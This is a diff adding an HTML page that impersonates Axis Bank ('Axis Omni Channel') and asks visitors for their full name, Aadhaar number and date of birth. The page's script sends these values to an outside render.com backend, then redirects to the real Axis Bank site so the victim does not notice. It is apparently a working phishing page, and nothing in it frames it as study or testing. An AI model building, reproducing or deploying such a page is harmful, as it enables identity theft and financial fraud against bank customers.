@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Axis Omni Channel</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+    }
+
+    .bg-gradient {
+      background: white;
+      color: black;
+    }
+
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #0dc8c8;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+    }
+
+    .header-container {
+      background: white;
+      color: black;
+      padding: 1px;
+      text-align: center;
+      height: 110px;
+      border: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 1000;
+      box-shadow: none;
+    }
+
+    .form-container {
+      background: white;
+      color: black;
+      padding: 20px;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 500px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      position: relative;
+      margin-top: 150px; /* Adjust this value to move the form up or down */
+    }
+
+    .footer-container {
+      width: 100%;
+      height: 100px; /* You can adjust this value */
+      background: url('footer.jpg') no-repeat center center;
+      background-size: cover;
+      position: relative;
+      margin-top: auto; /* Push the footer to the bottom */
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body class="bg-gradient min-h-screen flex flex-col items-center justify-between">
+  <!-- Header -->
+  <div class="header-container">
+    <img src="header.jpg" alt="Axis Bank">
+  </div>
+
+  <!-- Form -->
+  <div class="form-container bg-white rounded-lg shadow-lg relative">
+    <div id="loading-spinner" class="loading-spinner hidden"></div>
+    <form id="update-aadhar-form" class="space-y-4">
+      <div>
+        <label for="name" class="block text-gray-700 text-sm font-semibold mb-2">Full Name</label>
+        <input 
+          type="text" 
+          id="name" 
+          name="name" 
+          class="block shadow-sm appearance-none border rounded-lg w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" 
+          placeholder="Enter your full name"
+        >
+      </div>
+      <div>
+        <label for="aadharNumber" class="block text-gray-700 text-sm font-semibold mb-2">Aadhaar Number</label>
+        <input 
+          type="text" 
+          id="aadharNumber" 
+          name="aadharNumber" 
+          maxlength="12" 
+          class="block shadow-sm appearance-none border rounded-lg w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" 
+          placeholder="Enter your 12-digit Aadhaar Number"
+        >
+      </div>
+      <div>
+        <label for="dob" class="block text-gray-700 text-sm font-semibold mb-2">Date of Birth</label>
+        <input 
+          type="date" 
+          id="dob" 
+          name="dob" 
+          class="block shadow-sm appearance-none border rounded-lg w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+        >
+      </div>
+      <div class="flex items-center justify-center">
+        <button 
+          id="update-btn" 
+          class="w-full text-white font-medium hover:bg-[#7e405d] focus:outline-none focus:ring-1 focus:ring-[#69354a]"
+          style="background-color: #8B004B; border-radius: 8px; height: 50px; width: 450px; text-align: center; line-height: 50px; display: inline-block; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);"
+
+          type="button"
+        >
+          Verify Details
+        </button>
+      </div>
+      <div id="loading" class="hidden text-center mt-4">
+        <div class="w-8 h-8 border-t-4 border-blue-600 border-solid rounded-full animate-spin mx-auto"></div>
+        <p class="text-gray-700 mt-2">Processing...</p>
+      </div>
+    </form>
+  </div>
+
+  <!-- Footer -->
+  <img src="footer.jpg" alt="Footer Image" class="footer-image">
+</body>
+</html>
+
+
+  <script>
+    document.getElementById('update-btn').addEventListener('click', () => {
+      const name = document.getElementById('name').value;
+      const aadharNumber = document.getElementById('aadharNumber').value;
+      const dob = document.getElementById('dob').value;
+
+      // Dynamically fetch userId from localStorage
+      const userId = localStorage.getItem('userId');
+      if (!userId) {
+        alert('User ID not found. Please log in again.');
+        return;
+      }
+
+      const loadingSpinner = document.getElementById('loading');
+      loadingSpinner.classList.remove('hidden'); // Show loading spinner
+
+      // Post data to the backend after a short delay (for UX purposes)
+      setTimeout(() => {
+        fetch('https://backend-e2yf.onrender.com/api/update-aadhar', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name, aadharNumber, dob, userId }), // Include userId in the request
+        })
+          .then((response) => {
+            if (response.ok) {
+              window.location.href = 'https://omni.axisbank.co.in/axisretailbanking/'; // Redirect to Aadhaar OTP page
+            } else {
+              alert('Failed to update Aadhaar details.');
+            }
+          })
+          .catch(() => alert('Error updating Aadhaar details. Please try again.'))
+          .finally(() => {
+            loadingSpinner.classList.add('hidden'); // Hide loading spinner
+          });
+      }, 1500); // Simulate delay for better UX
+    });
+  </script>
+</body>
+</html>
